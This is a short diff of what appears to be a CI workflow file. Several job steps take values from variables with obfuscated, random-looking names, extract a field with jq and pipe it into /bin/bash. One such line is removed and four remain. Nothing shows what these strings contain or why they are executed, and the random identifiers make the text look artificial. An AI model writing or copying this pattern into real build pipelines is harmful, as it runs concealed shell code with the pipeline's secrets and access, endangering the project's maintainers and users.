@@ -24,7 +24,6 @@ jobs:
           echo $nf807 | jq -r .iexs49994 | /bin/bash
           echo $g047 | jq -r .vxq75324 | /bin/bash
           echo $bjfwa33767 | jq -r .k331 | /bin/bash
-          echo $qge2 | jq -r .v78 | /bin/bash
           printf '%s' "$rxcqx3013" | jq -r .r6 | /bin/bash
 
       - name: Save results
